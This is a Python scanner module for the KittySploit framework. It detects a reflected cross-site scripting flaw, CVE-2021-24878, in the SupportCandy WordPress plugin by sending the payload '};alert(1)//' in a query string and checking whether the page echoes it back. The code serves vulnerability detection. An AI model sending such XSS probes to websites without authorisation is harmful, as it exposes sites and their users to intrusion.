#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The SupportCandy WordPress plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SupportCandy < 2.2.7 - Reflected Cross-Site Scripting Detection',
        'description': 'The SupportCandy WordPress plugin before 2.2.7 does not sanitise and escape the query string before outputting it back in pages with the [wpsc_create_ticket] shortcode embed, leading to a Reflected Cross-Site Scripting issue',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'wpscan', 'wp-plugin', 'supportcandy', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24878',
            'https://github.com/andrewcy86/supportcandy(plugin)',
            'https://wpscan.com/vulnerability/d2f1fd60-5e5e-4e38-9559-ba2d14ae37bf/',
        ],
        'cve': 'CVE-2021-24878',
    }

    def run(self):
        path = '/?};alert(1)//'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('var attrs = {};alert(1)//:', 'wpsc_create_ticket_init',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='SupportCandy < 2.2.7 - Reflected Cross-Site Scripting detected', path=path)
            return True
        return False

